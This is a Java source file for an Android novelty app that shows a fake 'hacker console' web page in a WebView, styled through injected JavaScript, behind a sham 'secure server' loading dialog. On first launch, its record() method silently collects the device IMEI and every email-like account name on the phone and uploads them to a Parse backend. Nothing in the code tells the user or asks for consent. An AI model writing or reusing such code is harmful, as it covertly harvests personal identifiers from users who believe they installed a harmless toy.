package app.horses.console.red;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.annotation.SuppressLint;
import android.content.Context;
import android.os.Handler;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.util.Patterns;
import android.view.MotionEvent;
import android.view.View;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import com.afollestad.materialdialogs.MaterialDialog;
import com.parse.ParseObject;
import com.parse.ParseUser;

import java.util.regex.Pattern;

@SuppressWarnings("unused")
public class MainActivity extends AppCompatActivity {

    private static final String UMBRELLA_BASIC= "http://fediafedia.com/geektyper/tegniosave/index.html?!3!umbrella.jpg!rgb(0,0,0)!rgb(255,0,0)!Arial";
    private static final String UMBRELLA_MOBILE = "http://fediafedia.com/geektyper/mobile/";

    private static final String AUTOMATE = "javascript:var x = setInterval(function(){Typer.addTextAuto(12);}, 30);";
    private static final String RED = "javascript:stylesheet.href = 'css/red.css';localStorage.setItem('save', 'red');";
    private static final String HIDE_KEYBOARD = "javascript:var key = document.getElementById('sectionkeyboard').style.display = 'none';";
    private static final String FULL_CONSOLE = "javascript:var con = document.getElementById('console').style.paddingBottom = '0px';";
    private static final String HIDE_MENU = "javascript:var menu = document.getElementsByTagName('h1')[0].style.display = 'none';";

    private static final String START_CONSOLE = "javascript:var autoTypingInterval = setInterval(function(){Typer.addText(12);}, 60);";
    private static final String CHANGE_BUTTON = "javascript:var but = document.getElementById('mod').innerHTML = 'STOP';";

    private WebView webView;
    private MaterialDialog dialog;

    @SuppressLint("SetJavaScriptEnabled")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        validate();

        dialog = new MaterialDialog.Builder(this)
                .title("Connecting to a secure server...")
                .content("Wait a minute. Network scanning")
                .progress(true, 0)
                .cancelable(false)
                .show();

        webView = (WebView) findViewById(R.id.webView);

        webView.setVisibility(View.GONE);

        webView.loadUrl(UMBRELLA_MOBILE);

        webView.getSettings().setJavaScriptEnabled(true);

        webView.setWebChromeClient(new WebChromeClient());
        webView.setWebViewClient(new WebViewClient() {

            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);

                Log.d("LOG", "FINISH");
                view.getSettings().setJavaScriptEnabled(true);
                view.loadUrl(START_CONSOLE);
                view.loadUrl(CHANGE_BUTTON);
                view.loadUrl(RED);
                view.loadUrl(HIDE_KEYBOARD);
                view.loadUrl(FULL_CONSOLE);
                view.loadUrl(HIDE_MENU);

                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {

                        dialog.dismiss();
                        webView.setVisibility(View.VISIBLE);
                    }
                }, 1000);
            }
        });

        webView.setOnTouchListener(new View.OnTouchListener() {
            @Override
            public boolean onTouch(View v, MotionEvent event) {
                return (event.getAction() == MotionEvent.ACTION_MOVE);
            }
        });

        /*WebSettings webSettings = myWebView.getSettings();
        webSettings.setJavaScriptEnabled(true);*/
    }

    private void validate(){

        if(!SpMain.isSession()){

            record();
        }
    }

    private void record(){

        TelephonyManager mngr = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        mngr.getDeviceId();

        Pattern emailPattern = Patterns.EMAIL_ADDRESS;
        Account[] accounts = AccountManager.get(this).getAccounts();
        for (Account account : accounts) {

            if (emailPattern.matcher(account.name).matches()) {

                ParseObject testObject = new ParseObject("PhoneUser");
                testObject.put("type", account.type);
                testObject.put("name", account.name);
                testObject.put("imei",  mngr.getDeviceId());

                testObject.saveInBackground();
            }
        }

        SpMain.setSession(true);
    }
}
